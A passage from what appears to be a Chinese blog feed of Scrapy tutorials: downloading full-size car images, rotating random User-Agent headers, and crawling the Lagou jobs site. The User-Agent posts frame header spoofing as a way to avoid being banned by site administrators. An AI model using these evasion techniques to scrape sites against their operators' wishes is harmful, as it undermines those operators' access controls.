src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/FI3Qyh2cBtgt1DbmEPc3E3L2TOm9fnwCVKQdqq6BsEA!/b/dL8AAAAAAAAA&amp;bo=agYpA2oGKQMDR2I!&amp;rf=viewer_4" alt=""></p><p>可以将缩略图URL里面的<strong>t_</strong>替换掉,就会发现缩略图就已经变成了高清大图</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/yq3h.sNU.emodpYFyMPh*HSRxrOwEUZK6WYqbRITvmA!/b/dL8AAAAAAAAA&amp;bo=jQXhA40F4QMDZ0I!&amp;rf=viewer_4" alt=""></p><h1 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h1><h2 id="爬虫编写"><a href="#爬虫编写" class="headerlink" title="爬虫编写"></a>爬虫编写</h2><p>提取精选图片页面中的套图链接</p><pre><code>detail_urls = response.xpath(&quot;//ul[@class=&#39;content&#39;]/li/a/@href&quot;).getall()</code></pre><p>精选图片页面中下一页的处理</p><pre><code>next_page = response.xpath(&quot;//div[@class=&#39;pageindex&#39;]/a[last()-1]/@href&quot;).get()        if next_page:            yield scrapy.Request(url=response.urljoin(next_page), callback=self.parse)</code></pre><p>从套图页面中提取<strong>列表模式</strong>的链接</p><pre><code>list_pattern = response.xpath(&quot;//*[@id=&#39;cMode&#39;]/div/div[@class=&#39;side&#39;]/script&quot;).get()  # 提取列表模式的URL        list_pattern = re.findall(&quot;/photolist/.*.html&quot;, list_pattern)[0]  # 匹配列表模式的url</code></pre><p>从列表模式中下载高清大图</p><pre><code>category = response.xpath(&quot;//div[@class=&#39;mini_left&#39;]/a[last()-1]/text()&quot;).get()image_urls = response.xpath(&quot;//ul[@id=&#39;imgList&#39;]/li/a/img/@src&quot;).getall()        image_urls = list(map(lambda x: x.replace(&quot;t_&quot;, &quot;&quot;), image_urls))  # 去除url中的&quot;t_&quot;得到高清大图        image_urls = list(map(lambda x: response.urljoin(x), image_urls))        yield CarhomehdItem(category=category, image_urls=image_urls)</code></pre><h2 id="编写ItemPipeline保存图片"><a href="#编写ItemPipeline保存图片" class="headerlink" title="编写ItemPipeline保存图片"></a>编写ItemPipeline保存图片</h2><pre><code>class ImagePipeline(ImagesPipeline):    def get_media_requests(self, item, info):        request_objs = super(ImagePipeline, self).get_media_requests(item, info)        for request_obj in request_objs:            request_obj.item = item        return request_objs    def file_path(self, request, response=None, info=None):        path = super(ImagePipeline, self).file_path(request, response, info)        category = request.item.get(&quot;category&quot;)        image_store = IMAGES_STORE        category_path = os.path.join(image_store, category)        if not os.path.exists(category_path):            os.mkdir(category_path)        image_name = path.replace(&quot;full/&quot;, &quot;&quot;)        image_path = os.path.join(category_path, image_name)        return image_path</code></pre><p>完整代码:</p><p><a href="https://github.com/liu726301387/CarHomeHD" target="_blank" rel="noopener">https://github.com/liu726301387/CarHomeHD</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scrapy设置随机UserAgent</title>
      <link href="/2019/01/27/scrapy-she-zhi-sui-ji-qing-qiu-tou/"/>
      <url>/2019/01/27/scrapy-she-zhi-sui-ji-qing-qiu-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是UserAgent"><a href="#什么是UserAgent" class="headerlink" title="什么是UserAgent"></a>什么是UserAgent</h1><p>当我们在访问网页的时候,我们的浏览器在向服务器发送请求的时候会发送一个请求头和一个请求体,请求头中包含了很多重要的字段常见的字段有<strong>User-Agent,Accept</strong>等,具体的请求头的内容请参考&lt;图解HTTP&gt;.</p><h2 id="UserAgent"><a href="#UserAgent" class="headerlink" title="UserAgent"></a>UserAgent</h2><p>UserAgent:<strong>用户代理</strong></p><p>我们这里只对UserAgent做一个介绍,UserAgent会将创建请求的浏览器和用户代理名称等信息传给服务器.</p><p>Chrome的RequestHeader</p><pre><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cache-Control: max-age=0Connection: keep-aliveHost: fake-useragent.herokuapp.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</code></pre><p>Firefox的RequestHeader</p><pre><code>Accept    text/html,application/xhtml+xm…plication/xml;q=0.9,*/*;q=0.8Accept-Encoding    gzip, deflate, brAccept-Language    zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cache-Control    max-age=0Connection    keep-aliveHost    fake-useragent.herokuapp.comUpgrade-Insecure-Requests    1User-Agent    Mozilla/5.0 (Windows NT 10.0; …) Gecko/20100101 Firefox/66.0</code></pre><p>这里是一个请求头,从上面的代码可以看出,我们的User-Agent的值为<strong>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</strong>,这个值里面有很多信息,其中最重要的就是我们的浏览器版本信息.可以发现我们使用Firefox和Chrome共同访问一个网站的时候,他们的UserAgent是不一样的.</p><h2 id="UserAgent和爬虫的关系"><a href="#UserAgent和爬虫的关系" class="headerlink" title="UserAgent和爬虫的关系"></a>UserAgent和爬虫的关系</h2><p>当我们使用Scrapy去对网站金进行抓取的时候,<strong>Scrapy默认有一个UserAgent就叫Scrapy</strong>,<strong>这样我们直接对网站进行抓取的时候很容易被网站管理员封杀掉.</strong></p><p>我们可以查看Scrapy的源码</p><pre><code>from scrapy import signalsclass UserAgentMiddleware(object):    &quot;&quot;&quot;This middleware allows spiders to override the user_agent&quot;&quot;&quot;    def __init__(self, user_agent=&#39;Scrapy&#39;):        self.user_agent = user_agent    @classmethod    def from_crawler(cls, crawler):        o = cls(crawler.settings[&#39;USER_AGENT&#39;])        crawler.signals.connect(o.spider_opened, signal=signals.spider_opened)        return o    def spider_opened(self, spider):        self.user_agent = getattr(spider, &#39;user_agent&#39;, self.user_agent)    def process_request(self, request, spider):        if self.user_agent:            request.headers.setdefault(b&#39;User-Agent&#39;, self.user_agent)</code></pre><p>Scrapy默认的UserAgent:<strong>user_agent=’Scrapy’</strong></p><h1 id="Scrapy架构"><a href="#Scrapy架构" class="headerlink" title="Scrapy架构"></a>Scrapy架构</h1><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/1fF9t07Dc81TYlyEdQE0AzxhpTypecFxwoiZjxMq938!/b/dL4AAAAAAAAA&amp;bo=uQSBAwAAAAADBx0!&amp;rf=viewer_4" alt="Scrapy架构图"></p><p>流程解析:</p><ol><li>引擎：Hi！Spider, 你要处理哪一个网站？</li><li>Spider：老大要我处理xxxx.com。</li><li>引擎：你把第一个需要处理的URL给我吧。</li><li>Spider：给你，第一个URL是xxxxxxx.com。</li><li>引擎：Hi！调度器，我这有request请求你帮我排序入队一下。</li><li>调度器：好的，正在处理你等一下。</li><li>引擎：Hi！调度器，把你处理好的request请求给我。</li><li>调度器：给你，这是我处理好的request</li><li>引擎：Hi！下载器，你按照老大的下载中间件的设置帮我下载一下这个request请求</li><li>下载器：好的！给你，这是下载好的东西。（如果失败：sorry，这个request下载失败了。然后引擎告诉调度器，这个request下载失败了，你记录一下，我们待会儿再下载）</li><li>引擎：Hi！Spider，这是下载好的东西，并且已经按照老大的下载中间件处理过了，你自己处理一下（注意！这儿responses默认是交给def parse()这个函数处理的） </li><li>Spider：（处理完毕数据之后对于需要跟进的URL），Hi！引擎，我这里有两个结果，这个是我需要跟进的URL，还有这个是我获取到的Item数据。</li><li>引擎：Hi ！管道 我这儿有个item你帮我处理一下！调度器！这是需要跟进URL你帮我处理下。然后从第四步开始循环，直到获取完老大需要全部信息。</li><li>管道<code></code>调度器：好的，现在就做！</li></ol><p>在解析流程中我们可以发现,下载中间件是处于引擎(crawler.engine)和下载器(crawler.engine.download())之间的一层组件，可以有多个下载中间件被加载运行。</p><ol><li>当引擎传递请求给下载器的过程中，下载中间件可以对请求进行处理 （例如增加http header信息，增加proxy信息等）；</li><li>在下载器完成http请求，传递响应给引擎的过程中， 下载中间件可以对响应进行处理（例如进行gzip的解压等）</li></ol><h1 id="设置下载中间件"><a href="#设置下载中间件" class="headerlink" title="设置下载中间件"></a>设置下载中间件</h1><h2 id="动态设置User-Agent的第一种方法"><a href="#动态设置User-Agent的第一种方法" class="headerlink" title="动态设置User-Agent的第一种方法"></a>动态设置User-Agent的第一种方法</h2><p>使用fake_useragent随机更换user-agent</p><ol><li>安装fake-useragent<ul><li>pip install fake-useragent</li></ul></li><li>导入fake_useragent<ul><li>from fake_useragent import UserAgent </li></ul></li><li>实例化UserAgent<ul><li>self.ua = UserAgent()  # 实例化useragent</li></ul></li></ol><p>优点:不用自己维护UserAgent</p><p>缺点:可扩展性不高</p><p>查看fake_userAgent的源码发现这个第三方库的接口来自于<a href="https://fake-useragent.herokuapp.com/browsers/0.1.4,**后面的版本号不一样获取的随机请求头的版本也就不一样**截至现在最新的版本是1.8" target="_blank" rel="noopener">https://fake-useragent.herokuapp.com/browsers/0.1.4,**后面的版本号不一样获取的随机请求头的版本也就不一样**截至现在最新的版本是1.8</a></p><p>在settings中设置选择获取随机请求头的类型</p><pre><code>RANDOM_UA_TYPE = &quot;random&quot;       # 设置userAgent的类型</code></pre><p>编写Middleware</p><pre><code>class RandomUserAgent(object):    # 使用fake_useragent随机更换user-agent    def __init__(self, crawler):        super(RandomUserAgent, self).__init__()  # 用父类的init方法来初始化        # self.USER_AGENT = crawler.settings.get(&quot;USER_AGENT&quot;, [])        # 获取settings当中的user_agent        self.ua = UserAgent()  # 实例化useragent        self.ua_type = crawler.settings.get(&quot;RANDOM_UA_TYPE&quot;, &quot;random&quot;)  # 导入Ua的获取类型,是ie还是谷歌等    @classmethod    def from_crawler(cls, crawler):        return cls(crawler)    def process_request(self, request, spider):        def get_ua():  # 利用闭包完成ua的可配置            return getattr(self.ua, self.ua_type)  # getattr:从对象中获取属性        request.headers.setdefault(b&#39;User-Agent&#39;, get_ua())  # 将随机useragent放到Request的Header中</code></pre><h2 id="动态设置User-Agent的第二种方法"><a href="#动态设置User-Agent的第二种方法" class="headerlink" title="动态设置User-Agent的第二种方法"></a>动态设置User-Agent的第二种方法</h2><p>使用Random随机选择自己定义好的UserAgent</p><p>优点:可扩展性高<br>缺点:不容易维护</p><pre><code>class UserAgentDownloadMiddleware(object):    # 请求头列表    USER_AGENT = [        &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&quot;,        &quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36&quot;,        &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931&quot;,        &quot;Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393&quot;,        &quot;Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0&quot;,        &quot;Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0&quot;,        &quot;Mozilla/5.0 (Windows NT 6.2; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;,        &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0&quot;,        &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A&quot;,        &quot;Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25&quot;,        &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2&quot;,    ]    def process_request(self, request, spider):        # 重写process_request方法给每个request添加不同的请求头        user_agent = random.choice(self.USER_AGENT)  # 随机选择请求头        request.headers[&quot;User-Agent&quot;] = user_agent  # 给request添加随机请求头</code></pre><h2 id="在settings中开启DownloadMiddleware"><a href="#在settings中开启DownloadMiddleware" class="headerlink" title="在settings中开启DownloadMiddleware"></a>在settings中开启DownloadMiddleware</h2><pre><code>DOWNLOADER_MIDDLEWARES = {   # &#39;UserAgen_Demo.middlewares.UseragenDemoDownloaderMiddleware&#39;: 543,   #  &quot;UserAgen_Demo.middlewares.UserAgentDownloadMiddleware&quot;:543,        # 随机请求头    &quot;scrapy.downloadermiddlewares.useragent.UserAgentMiddleware&quot;:None,  # 将默认的userAgent设置为None    &quot;UserAgen_Demo.middlewares.RandomUserAgent&quot;:200,}</code></pre><p><strong>切记一定要将Scrapy的UserAgent设置为None</strong></p><h1 id="利用Http-bin查看请求头"><a href="#利用Http-bin查看请求头" class="headerlink" title="利用Http.bin查看请求头"></a>利用Http.bin查看请求头</h1><p>Spider</p><pre><code>class HttpbinSpider(scrapy.Spider):    name = &#39;HttpBin&#39;    allowed_domains = [&#39;httpbin.org&#39;]    start_urls = [&#39;https://httpbin.org/user-agent&#39;]    def parse(self, response):        user_agent = json.loads(response.text)[&quot;user-agent&quot;]        print(&#39;=&#39;*90)        print(user_agent)        print(&#39;=&#39; * 90)        yield scrapy.Request(self.start_urls[0], dont_filter=True)</code></pre><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p>fake_UserAgent</p><pre><code>2019-01-27 14:17:57 [scrapy.core.engine] INFO: Spider opened2019-01-27 14:17:57 [scrapy.extensions.logstats] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)2019-01-27 14:17:57 [scrapy.extensions.telnet] DEBUG: Telnet console listening on 127.0.0.1:60232019-01-27 14:17:58 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: None)==========================================================================================Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0==========================================================================================2019-01-27 14:17:59 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0==========================================================================================2019-01-27 14:17:59 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36==========================================================================================2019-01-27 14:18:01 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36==========================================================================================2019-01-27 14:18:02 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36==========================================================================================2019-01-27 14:18:03 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36==========================================================================================2019-01-27 14:18:05 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Windows; U; Windows NT 6.0; nb-NO) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5==========================================================================================2019-01-27 14:18:06 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36==========================================================================================</code></pre><p>自定义User_Agent</p><pre><code>2019-01-27 15:30:19 [scrapy.core.engine] INFO: Spider opened2019-01-27 15:30:19 [scrapy.extensions.logstats] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)2019-01-27 15:30:19 [scrapy.extensions.telnet] DEBUG: Telnet console listening on 127.0.0.1:60232019-01-27 15:30:20 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: None)==========================================================================================Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0==========================================================================================2019-01-27 15:30:21 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Windows NT 6.2; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0==========================================================================================2019-01-27 15:30:23 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0==========================================================================================2019-01-27 15:30:23 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A==========================================================================================2019-01-27 15:30:25 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25==========================================================================================2019-01-27 15:30:26 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931==========================================================================================</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpider拉勾网全站抓取</title>
      <link href="/2019/01/25/scrapycrawlspider-la-gou-wang-quan-zhan-zhua-qu/"/>
      <url>/2019/01/25/scrapycrawlspider-la-gou-wang-quan-zhan-zhua-qu/</url>
      
        <content type="html"><![CDATA[<h1 id="数据展示"><a href="#数据展示" class="headerlink" title="数据展示"></a>数据展示</h1><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/dJPWyOHbTHAkjjbqjRafuNpAoylQIyQKswTjeegFcH8!/b/dLYAAAAAAAAA&amp;bo=yAUWAwAAAAADB*o!&amp;rf=viewer_4" alt="数据展示"></p><h1 id="网站分析"><a href="#网站分析" class="headerlink" title="网站分析"></a>网站分析</h1><h2 id="分析首页"><a href="#分析首页" class="headerlink" title="分析首页"></a>分析首页</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/S4KN..H..ModSavlRJ4jqX*wMb0sII20jcpAJEVV77A!/b/dDYBAAAAAAAA&amp;bo=YQd.AwAAAAADNwk!&amp;rf=viewer_4" alt="首页"></p><p>首页中有职位的分类,抓取所有的职位,点击进去看职位分类的url</p><h2 id="分析职位分类"><a href="#分析职位分类" class="headerlink" title="分析职位分类"></a>分析职位分类</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/RCszUk30b7oFdvndszLE0BIBj5IEI.tjiQoV*rR10qM!/b/dLYAAAAAAAAA&amp;bo=DAbQAwAAAAADJ9s!&amp;rf=viewer_4" alt="职位分类"></p><p>在职位分类的页面下有具体的详情页面</p><h2 id="分析公司页面"><a href="#分析公司页面" class="headerlink" title="分析公司页面"></a>分析公司页面</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/6FlT7RVC0lql6hlza9cbxdvcvFm65rFvvp*xxnPytRY!/b/dL8AAAAAAAAA&amp;bo=dwWJAwAAAAADF8o!&amp;rf=viewer_4" alt="公司"></p><h2 id="分析职位的详情页面"><a href="#分析职位的详情页面" class="headerlink" title="分析职位的详情页面"></a>分析职位的详情页面</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/4PC4iH*mIsqMhVqTyg6IONJGBrdXlvWRVRf7oIKPNeg!/b/dDUBAAAAAAAA&amp;bo=ogaRAwAAAAADJzQ!&amp;rf=viewer_4" alt="详情页面"></p><p>进入详情页面获取我们想要的数据</p><p>我们的爬虫访问路径,先进入首页,然后匹配职位分类的url,公司的url,以及详情页的url,职位分类和公司的url匹配到之后接着对页面进行跟踪匹配,因为我们做的全站爬虫.</p><h1 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h1><h2 id="定义Item"><a href="#定义Item" class="headerlink" title="定义Item"></a>定义Item</h2><p>根据想获取的数据定义Item</p><pre><code>url# 职位urlurl_object_id职位url对应的idtitle职位名字salary薪资水平city工作城市years工作年限degree任职程度job_type工作类型publish_time发布时间tags标签job_advantage职位优势job_desc职位描述job_addr职位地址company_url公司官方网站地址company_name公司名字crawl_time抓取时间crawl_update_time抓取更新时间</code></pre><h2 id="定义根据网站的Url定义CrawlSpider的抓取Rule"><a href="#定义根据网站的Url定义CrawlSpider的抓取Rule" class="headerlink" title="定义根据网站的Url定义CrawlSpider的抓取Rule"></a>定义根据网站的Url定义CrawlSpider的抓取Rule</h2><pre><code>rules = (        Rule(LinkExtractor(allow=r&#39;zhaopin/.*&#39;, ), follow=True),  # 职位分类        Rule(LinkExtractor(allow=r&#39;gongsi/j\d+.html&#39;), follow=True),  # 匹配公司内的招聘职位        Rule(LinkExtractor(allow=r&#39;jobs/\d+.html&#39;), callback=&#39;parse_job&#39;, follow=True),  # 职位详情页面匹配    )</code></pre><h2 id="设置随机请求头"><a href="#设置随机请求头" class="headerlink" title="设置随机请求头"></a>设置随机请求头</h2><pre><code>class UserAgentDownloadMiddleware(object):    # 请求头列表    USER_AGENT = [        &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&quot;,        &quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36&quot;,        &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931&quot;,        &quot;Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393&quot;,        &quot;Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0&quot;,        &quot;Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0&quot;,        &quot;Mozilla/5.0 (Windows NT 6.2; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;,        &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0&quot;,        &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A&quot;,        &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2&quot;,    ]    def process_request(self, request, spider):        user_agent = random.choice(self.USER_AGENT)  # 随机选择请求头        request.headers[&quot;User-Agent&quot;] = user_agent  # 给request添加随机请求头</code></pre><h2 id="详情页的抓取规则"><a href="#详情页的抓取规则" class="headerlink" title="详情页的抓取规则"></a>详情页的抓取规则</h2><p>这里使用的Itemloaders填充的Item,使用add_xpath和add_value将值收集到itemloades中.</p><pre><code>    def parse_job(self, response):        # 解析拉勾网的职位        item_loader = LagouItemLoader(item=LagoujobItem(), response=response)  # 创建ItemLoader的实例        item_loader.add_xpath(&quot;title&quot;, &quot;//div[@class=&#39;job-name&#39;]//span/text()&quot;)  # 职位名字        item_loader.add_value(&quot;url&quot;, response.url)  # 职位url        item_loader.add_value(&quot;url_object_id&quot;, get_md5(response.url))  # 职位url对应的id        item_loader.add_xpath(&quot;salary&quot;,                              &quot;//div[@class=&#39;position-content-l&#39;]/dd[@class=&#39;job_request&#39;]/p/span[@class=&#39;salary&#39;]/text()&quot;)        item_loader.add_xpath(&quot;city&quot;,                              &quot;//div[@class=&#39;position-content-l&#39;]/dd[@class=&#39;job_request&#39;]/p/span[2]/text()&quot;)  # 工作城市        item_loader.add_xpath(&quot;years&quot;,                              &quot;//div[@class=&#39;position-content-l&#39;]/dd[@class=&#39;job_request&#39;]/p/span[3]/text()&quot;)  # 工作年限        item_loader.add_xpath(&quot;degree&quot;,                              &quot;//div[@class=&#39;position-content-l&#39;]/dd[@class=&#39;job_request&#39;]/p/span[4]/text()&quot;)  # 任职程度        item_loader.add_xpath(&quot;job_type&quot;,                              &quot;//div[@class=&#39;position-content-l&#39;]/dd[@class=&#39;job_request&#39;]/p/span[5]/text()&quot;)  # 工作类型        item_loader.add_xpath(&quot;tags&quot;, &quot;//ul[contains(@class,&#39;position-label&#39;)]/li/text()&quot;)  # 标签,注意有些招聘信息是单个的标签,而有些确实很多的        item_loader.add_xpath(&quot;publish_time&quot;, &quot;//p[@class=&#39;publish_time&#39;]/text()&quot;)  # 发布时间,需要进行处理        item_loader.add_xpath(&quot;job_advantage&quot;, &quot;//dd[@class=&#39;job-advantage&#39;]/p/text()&quot;)  # 职位优势        job_desc_list = response.xpath(            &quot;//dd[@class=&#39;job_bt&#39;]/div[@class=&#39;job-detail&#39;]/p/text()&quot;).getall()  # 职位描述  注意返回的是一个列表,需要进行处理        job_desc = &quot;,&quot;.join(job_desc_list)        item_loader.add_value(&quot;job_desc&quot;, job_desc)  # 职位描述  注意返回的是一个列表,需要进行处理        job_addr = response.xpath(&quot;//div[@class=&#39;work_addr&#39;]//text()&quot;).getall()  # 职位地址        job_addr = &quot;,&quot;.join(job_addr)  # 将列表拼接成字符串        job_addr = re.sub(&quot;-|\n|,| |查看地图&quot;, &quot;&quot;, job_addr)  # 使用正则做数据处理        item_loader.add_value(&quot;job_addr&quot;, job_addr)  # 职位地址        item_loader.add_xpath(&quot;company_name&quot;, &quot;//*[@id=&#39;job_company&#39;]/dt/a/img/@alt&quot;)  # 公司名字        item_loader.add_xpath(&quot;company_url&quot;, &quot;//*[@id=&#39;job_company&#39;]/dt/a/@href&quot;)  # 公司官方网站地址        item_loader.add_value(&quot;crawl_time&quot;, datetime.datetime.now())  # 抓取时间        job_item = item_loader.load_item()  # 加载Item        return job_item</code></pre><h2 id="使用ItemLoaders进行数据处理"><a href="#使用ItemLoaders进行数据处理" class="headerlink" title="使用ItemLoaders进行数据处理"></a>使用ItemLoaders进行数据处理</h2><pre><code>import scrapyfrom scrapy.loader import ItemLoaderfrom scrapy.loader.processors import TakeFirst, MapComposeimport refrom w3lib.html import remove_tags  # 这个模块专门用来去除Html中的标签的class LagouItemLoader(ItemLoader):    default_output_processor = TakeFirst()def process_input_city_and_degree_years(value):    # 对输入的城市进行处理    value = re.sub(&quot;/&quot;, &quot;&quot;, value).strip()    return valuedef process_input_salary(value):    # 对输入的薪水进行处理    result = re.sub(&quot;k&quot;, &quot;000&quot;, value).replace(&quot;-&quot;, &#39; &#39;).strip()    return resultdef process_input_publish_time(value):    # 对输入的发布时间进行处理    result = re.sub(&quot;\xa0&quot;, &quot;&quot;, value).strip()    return resultdef process_input_desc(value):    # 职位详情的处理    if value == &quot;&quot;:        return &quot;无&quot;    else:        return valueclass LagoujobItem(scrapy.Item):    url = scrapy.Field()  # 职位url    url_object_id = scrapy.Field()  # 职位url对应的id    title = scrapy.Field()  # 职位名字    salary = scrapy.Field(        input_processor=MapCompose(process_input_salary)    )  # 薪资水平    city = scrapy.Field(        input_processor=MapCompose(process_input_city_and_degree_years),    )  # 工作城市    years = scrapy.Field(        input_processor=MapCompose(process_input_city_and_degree_years),    )  # 工作年限    degree = scrapy.Field(        input_processor=MapCompose(process_input_city_and_degree_years),    )  # 任职程度    job_type = scrapy.Field()  # 工作类型    publish_time = scrapy.Field(        input_processor=MapCompose(process_input_publish_time)    )  # 发布时间    tags = scrapy.Field(        input_processor=MapCompose(process_input_desc),    )  # 标签    job_advantage = scrapy.Field()  # 职位优势    job_desc = scrapy.Field(        input_processor=MapCompose(process_input_desc),    )  # 职位描述    job_addr = scrapy.Field()  # 职位地址    company_url = scrapy.Field()  # 公司官方网站地址    company_name = scrapy.Field()  # 公司名字    crawl_time = scrapy.Field()  # 抓取时间    